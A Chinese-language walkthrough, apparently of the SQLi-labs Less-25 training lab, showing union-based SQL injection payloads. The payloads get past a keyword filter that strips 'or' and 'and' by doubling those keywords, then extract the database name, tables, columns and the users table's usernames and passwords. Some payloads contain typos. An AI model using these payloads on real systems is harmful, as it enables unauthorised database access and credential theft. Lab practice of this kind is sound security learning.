---
title: less25
url: https://www.yuque.com/u29002979/ep2zrx/qtim2f7q089hwsoz
---

```bash
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";

$id= preg_replace('/or/i',"", $id);			
$id= preg_replace('/AND/i',"", $id);
```

> Alll Your 'OR' and AND' belong to us.

'and','or'和'AND','OR'被**过滤** <a name="VYZoO"></a>

# 检查注入点

`?id=1'`

> **Warning**: mysql\_fetch\_array() expects parameter 1 to be resource, boolean given in **E:\phpstudy\_pro\WWW\sql.com\Less-25\index.php** on line **37**
> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

可看出是**单引号'**闭合 <a name="ua3BP"></a>

# 测试字段数

`1' order by 4 --+`

> **Warning**: mysql\_fetch\_array() expects parameter 1 to be resource, boolean given in **E:\phpstudy\_pro\WWW\sql.com\Less-25\index.php** on line **37**
> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'der by 4-- ' LIMIT 0,1' at line 1

or被过滤了。换大写试试。
`1' ORder by 4 --+`
同样的报错，看来大写也被过滤了。试试双写or 'oorr'
`1' oorrder by 4--+`

> **Warning**: mysql\_fetch\_array() expects parameter 1 to be resource, boolean given in **E:\phpstudy\_pro\WWW\sql.com\Less-25\index.php** on line **37**
> Unknown column '4' in 'order clause'

没有第4列
`1' oorrder by 3--+`返回正常
有3个字段。

<a name="tls7t"></a>

# 检查回显点

`-1' union select 1,2,3-- +`
显示2，3是回显点 <a name="DJ9KV"></a>

# 爆破数据库名称

`-1' union select 1,2,(select database())-- +` <a name="yJOW1"></a>

# 爆破数据表

`-1' union select 1,2,(select group_concat(table_name) from info**or**rmation_schema.tables where table_schema=database())--+` <a name="za0hf"></a>

# 爆破字段名称

`-1' union select 1,2,(select group_concat(column_name) form info**or**rmation_schema.cloumns where table_schema=database() and table_name='users')--+`

> **Warning**: mysql\_fetch\_array() expects parameter 1 to be resource, boolean given in **E:\phpstudy\_pro\WWW\sql.com\Less-25\index.php** on line **37**
> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'table\_name='users')-- ' LIMIT 0,1' at line 1

and 被过滤了，双写and    'aandnd'
`-1' union select 1,2,(select group_concat(column_name) from info**or**rmation_schema.columns where table_schema=database() a**and**nd table_name='users')--+` <a name="qEq7I"></a>

# 爆破字段内容

`-1' union select 1,2,(select group_concat(username,0x7e,passwo**or**rd) from users)--+`
